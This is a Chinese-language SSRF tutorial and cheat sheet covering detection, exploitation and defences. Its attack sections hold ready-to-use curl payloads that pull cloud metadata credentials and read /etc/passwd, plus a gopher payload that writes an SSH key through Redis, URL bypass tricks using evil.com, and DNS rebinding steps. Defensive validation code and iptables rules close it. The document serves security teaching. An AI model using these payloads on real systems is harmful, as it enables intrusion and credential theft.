# 🌐 服务端请求伪造 SSRF（A10: Server-Side Request Forgery）全技巧

> **OWASP Top 10 2021 — 第10位**  
> 攻击者通过构造恶意请求，让服务器向内部系统发起请求，从而访问内部资源或执行未授权操作。

---

## 📋 一、漏洞基础

### 1.1 什么是SSRF？

SSRF（Server-Side Request Forgery）是指攻击者能够**控制服务器向任意地址发起请求**，通常用于访问内部网络资源、绕过防火墙、或与内网服务交互。

### 1.2 常见场景

| 场景 | 说明 | 示例 |
|------|------|------|
| 🚫 **URL参数** | 用户传入URL，服务器访问 | `?url=https://内部IP` |
| 🚫 **文件预览** | 通过URL加载远程图片/文件 | 头像URL、文件导入 |
| 🚫 **Webhook** | 用户设置回调URL | Webhook POST到内网 |
| 🚫 **API代理** | 服务器代理访问外部API | API网关、抓取服务 |
| 🚫 **文档处理** | 解析文档中的外部引用 | XML外部实体（XXE） |
| 🚫 **SSRF + Redis** | 利用SSRF攻击内网Redis | 写SSH密钥/计划任务 |

### 1.3 危害

- 扫描内网端口和服务
- 访问云元数据服务（AWS/GCP/Azure）
- 攻击内网Redis/Memcached/MySQL等
- 读取本地文件（file://协议）
- 绕过IP白名单/防火墙
- 远程代码执行（结合其他漏洞）

---

## 🔍 二、基础检测技巧

### 2.1 入口点识别

```bash
# 寻找可能包含SSRF的常见参数
# ?url=, ?file=, ?path=, ?image=, ?src=
# ?redirect=, ?callback=, ?webhook=, ?endpoint=
# ?data=, ?target=, ?host=, ?address=

# 测试基本SSRF
curl "https://target.com/fetch?url=http://127.0.0.1:8080"
curl "https://target.com/fetch?url=http://localhost"
curl "https://target.com/fetch?url=http://[::1]"

# 测试云元数据
curl "https://target.com/fetch?url=http://169.254.169.254/"
curl "https://target.com/fetch?url=http://metadata.google.internal/"
curl "https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/"
```

### 2.2 使用DNSLog检测

```bash
# 使用DNSLog或Burp Collaborator检测SSRF

# 1. 获取一个DNSLog域名
# https://dnslog.cn/ 或 Burp Collaborator

# 2. 发送SSRF请求
curl "https://target.com/fetch?url=http://your-dnslog-server/test"

# 3. 查看DNSLog是否有DNS请求
# 如果有请求记录，说明存在SSRF

# 使用HTTPLog检测
curl "https://target.com/fetch?url=http://your-http-log-server/probe"
```

### 2.3 内网IP探测

```bash
# 探测常见内网网段
for ip in 127.0.0.1 10.0.0.1 172.16.0.1 192.168.1.1 192.168.0.1; do
  url="http://$ip:80"
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/fetch?url=$url")
  echo "$ip:80 -> $code"
done

# 探测端口
for port in 22 80 443 3306 6379 8080 9200 27017; do
  url="http://127.0.0.1:$port"
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/fetch?url=$url")
  echo "127.0.0.1:$port -> $code"
done
```

### 2.4 协议探测

```bash
# 测试file协议（读取本地文件）
curl "https://target.com/fetch?url=file:///etc/passwd"
curl "https://target.com/fetch?url=file:///c:/windows/win.ini"

# 测试dict协议（向端口发送字符串）
curl "https://target.com/fetch?url=dict://127.0.0.1:6379/INFO"

# 测试gopher协议（发送任意TCP数据）
# gopher://host:port/_后接TCP数据

# 测试ftp协议
curl "https://target.com/fetch?url=ftp://ftp.target.com/file"

# 测试sftp协议
curl "https://target.com/fetch?url=sftp://user@host/file"
```

---

## 🚀 三、进阶利用技巧

### 3.1 云元数据攻击

```bash
# AWS 元数据服务（IMDSv1）
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
# 获取临时AWS凭证（AccessKey, SecretKey, Token）

# AWS IMDSv2 绕过
# IMDSv2 需要 PUT /latest/api/token
# 如果目标支持IMDSv1，直接访问

# GCP 元数据服务
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
# 需要添加头 Metadata-Flavor: Google
# 但某些SSRF实现会转发自定义头

curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# 获取GCP服务账号Token

# Azure 元数据服务
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# 需要添加头 Metadata: true

# 阿里云元数据
curl "https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/"
```

### 3.2 内网Redis攻击（SSRF→RCE）

```bash
# 利用SSRF攻击内网Redis
# Redis默认无认证，可写入SSH密钥或计划任务

# 使用gopher协议攻击Redis
# Redis协议：*3\r\n$3\r\nSET\r\n$4\r\nkey\r\n$5\r\nvalue

# 写入SSH公钥（Ubuntu）
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2E... %0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a

# 写入计划任务（反弹shell）
# CentOS: /var/spool/cron/root
# Ubuntu: /var/spool/cron/crontabs/root
```

### 3.3 URL解析绕过技术

```python
# 绕过URL黑名单的各种技巧

# 1. 使用替代IP表示
127.0.0.1 → 2130706433（十进制IP）
127.0.0.1 → 0x7f000001（十六进制IP）
127.0.0.1 → 0177.0.0.1（八进制）
127.0.0.1 → 127.1（省略0）
127.0.0.1 → 0（简写）

# 2. 使用DNS解析
# 注册一个解析到127.0.0.1的域名
ssrf-redirect.com A 127.0.0.1

# 3. 利用URL解析差异
# 不同库对URL的解析不一致
http://evil.com@127.0.0.1  # 某些库解析为127.0.0.1
http://127.0.0.1#@evil.com  # 某些库解析为127.0.0.1

# 4. 使用短链接/重定向
# 使用跳转服务将外部URL指向内网
https://t.cn/xxxxx → http://169.254.169.254

# 5. 使用Unicode/编码
http://⑦⑦⑦⑦⑦⑦⑦⑦.⑦⑦⑦⑦⑦⑦⑦⑦  # 全角数字
http://⓪⓪⓪⓪.⓪⓪⓪⓪.⓪⓪⓪⓪.⓪⓪⓪⓪

# 6. 使用IPv6
http://[::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

### 3.4 DNS重绑定攻击

```python
# DNS重绑定（DNS Rebinding）
# 利用短TTL的DNS记录，通过域名解析到不同IP

# 使用 DNS重绑定 服务
# https://1u.ms/ 或 https://lock.cmpxchg8b.com/rebind.html

# 1. 配置域名同时解析到公共IP和内网IP
# example.rebind.com TTL=0
# 第一次查询 → 你的服务器IP
# 第二次查询 → 127.0.0.1

# 2. 攻击流程
# - 第一次请求：URL验证通过（指向公共IP）
# - 第二次请求：实际访问内网IP

# 使用 rbndr 工具
# https://github.com/taviso/rbndr
# python rbndr.py --public your_ip --target 169.254.169.254

# payload
curl "https://target.com/fetch?url=http://your-rebind-domain/metadata"
```

### 3.5 利用重定向扩大攻击面

```bash
# 如果服务端跟随重定向，可通过开放重定向扩大SSRF

# 1. 在公网搭建重定向服务
# HTTP 301 → http://169.254.169.254/latest/meta-data/

# 2. 使用开放重定向
# 某些网站有开放重定向功能
curl "https://target.com/fetch?url=https://open-redirect.com/redirect?url=http://169.254.169.254/"

# 3. 使用Web Archive重定向
curl "https://target.com/fetch?url=https://web.archive.org/web/2/http://169.254.169.254/"
```

### 3.6 内网服务探测与攻击

```bash
# 使用SSRF扫描内网服务

# 扫描SSH
curl "https://target.com/fetch?url=dict://192.168.1.1:22/"

# 扫描MySQL
curl "https://target.com/fetch?url=dict://192.168.1.1:3306/"

# 扫描Elasticsearch
curl "https://target.com/fetch?url=http://192.168.1.1:9200/_cat/indices"

# 扫描MongoDB
curl "https://target.com/fetch?url=http://192.168.1.1:27017/"

# 扫描Docker API
curl "https://target.com/fetch?url=http://192.168.1.1:2375/containers/json"

# 扫描Jenkins
curl "https://target.com/fetch?url=http://192.168.1.1:8080/script"

# 扫描Consul
curl "https://target.com/fetch?url=http://192.168.1.1:8500/v1/agent/services"

# 扫描Kubernetes API
curl "https://target.com/fetch?url=https://192.168.1.1:6443/api"
```

### 3.7 gopher协议高级利用

```bash
# gopher协议可以发送任意TCP数据，功能强大

# 攻击MySQL（无需认证的MySQL）
# gopher://host:3306/_MySQL数据包（十六进制）

# 攻击SMTP
# gopher://mail.target.com:25/_HELO attacker%0d%0aMAIL FROM:<>

# 攻击FastCGI（导致RCE）
# PHP-FPM默认监听9000端口
# gopher://127.0.0.1:9000/_构造FastCGI数据包
# 可以实现任意PHP代码执行

# FastCGI数据包构造（使用Gopherus工具）
# python gopherus.py --exploit fastcgi
# 或者使用 phpggc 生成
```

### 3.8 盲SSRF检测

```python
# 当SSRF无回显时，通过时间延迟或带外交互检测

# 时间延迟检测
import time
import requests

start = time.time()
requests.get("https://target.com/fetch?url=http://127.0.0.1:9999")
elapsed = time.time() - start
print(f"Timeout: {elapsed}s")  # 如果连接超时说明请求被发出

# 使用带外交互
# 使用 Burp Collaborator 或 interactsh
curl "https://target.com/fetch?url=http://your-collaborator-domain/probe"

# 使用 HTTP 状态码差异
# 端口开放 vs 端口关闭的不同响应时间/内容
```

---

## 🛡️ 四、防御方案

### 4.1 URL白名单验证

```python
# Python - 安全URL验证
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = ['api.target.com', 'cdn.target.com']
ALLOWED_SCHEMES = ['https']

def validate_url(url):
    """SSRF防护 - URL白名单验证"""
    try:
        parsed = urlparse(url)
        
        # 1. 协议白名单
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False, "仅允许HTTPS协议"
        
        # 2. 域名白名单
        hostname = parsed.hostname
        if not any(hostname.endswith(domain) for domain in ALLOWED_DOMAINS):
            return False, "域名不在白名单中"
        
        # 3. DNS解析后检查IP（防DNS重绑定）
        import socket
        ip = socket.gethostbyname(hostname)
        
        # 4. 禁止内网IP
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj.is_private:
            return False, "禁止访问内网IP"
        if ip_obj.is_loopback:
            return False, "禁止访问本地回环"
        if ip_obj.is_link_local:
            return False, "禁止访问链路本地"
        
        return True, url
    
    except Exception as e:
        return False, f"URL验证失败: {str(e)}"
```

### 4.2 网络层防护

```bash
# iptables 限制对外连接
# 允许访问特定外部服务
iptables -A OUTPUT -d api.target.com -j ACCEPT
iptables -A OUTPUT -d cdn.target.com -j ACCEPT

# 禁止访问内网
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -d 127.0.0.0/8 -j DROP
iptables -A OUTPUT -d 169.254.0.0/16 -j DROP

# 拒绝所有其他出站请求（默认拒绝）
iptables -A OUTPUT -j DROP

# 使用代理限制（如 Squid）
# 不允许访问内网
acl private_ips dst 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16
http_access deny private_ips
```

### 4.3 应用层防御

```python
# Django - 安全URL请求
import requests
from urllib.parse import urlparse

def safe_fetch(url):
    """安全发起请求"""
    # 禁用重定向
    session = requests.Session()
    session.max_redirects = 0
    
    # 设置超时（防止慢速攻击）
    resp = session.get(url, timeout=5)
    
    # 限制响应大小
    if len(resp.content) > 10 * 1024 * 1024:  # 10MB
        raise ValueError("响应过大")
    
    return resp

# 使用 nofollow 禁用重定向
resp = requests.get(url, allow_redirects=False)

# 禁用不必要的协议
# 在 urllib3 中禁用
from urllib3.util import connection
_orig_create_connection = connection.create_connection

def patched_create_connection(address, *args, **kwargs):
    host, port = address
    # 禁止连接内网
    ip = socket.gethostbyname(host)
    if ipaddress.ip_address(ip).is_private:
        raise ValueError("禁止连接内网")
    return _orig_create_connection(address, *args, **kwargs)

connection.create_connection = patched_create_connection
```

### 4.4 防御措施优先级

| 优先级 | 措施 | 效果 |
|--------|------|------|
| 🥇 | URL白名单 | 最安全，只允许已知域名 |
| 🥇 | 禁止内网IP | 防止对内网攻击 |
| 🥇 | 禁止metadata IP | 防止云凭证泄露 |
| 🥈 | 协议白名单 | 只允许http/https |
| 🥈 | DNS重绑定防护 | 多次DNS验证 |
| 🥈 | 禁用重定向 | 防止通过跳转绕过 |
| 🥉 | 速率限制 | 防止大规模扫描 |
| 🥉 | 响应限制 | 防止数据泄露 |

---

## 🎯 五、实战检查清单

### 5.1 渗透测试要点

- [ ] 识别所有用户可控制URL的参数
- [ ] 测试内网IP（127.0.0.1, 10.x, 172.x, 192.168.x）
- [ ] 测试云元数据接口（AWS/GCP/Azure/阿里云）
- [ ] 测试file://协议读取本地文件
- [ ] 测试dict/gopher协议攻击内网服务
- [ ] 测试DNS重绑定绕过
- [ ] 测试URL解析差异绕过
- [ ] 测试端口扫描内网服务
- [ ] 测试盲SSRF（时间延迟/带外交互）
- [ ] 测试能否通过SSRF攻击Redis/MySQL等

### 5.2 推荐工具

| 工具 | 用途 |
|------|------|
| SSRFMap | 自动化SSRF探测与利用 |
| Gopherus | gopher协议payload生成 |
| ngrok | 内网穿透搭建探测服务 |
| Burp Collaborator | 带外交互检测 |
| interactsh | 开源带外交互平台 |
| rbndr | DNS重绑定攻击 |
| SSRF Test | 浏览器自动化SSRF检测 |

---

> **💡 核心原则**：**永远不要让服务器根据用户输入直接发起网络请求！** 如果必须这么做，使用严格的白名单验证 + 多重防护（IP校验、协议限制、禁用重定向、速率限制）。
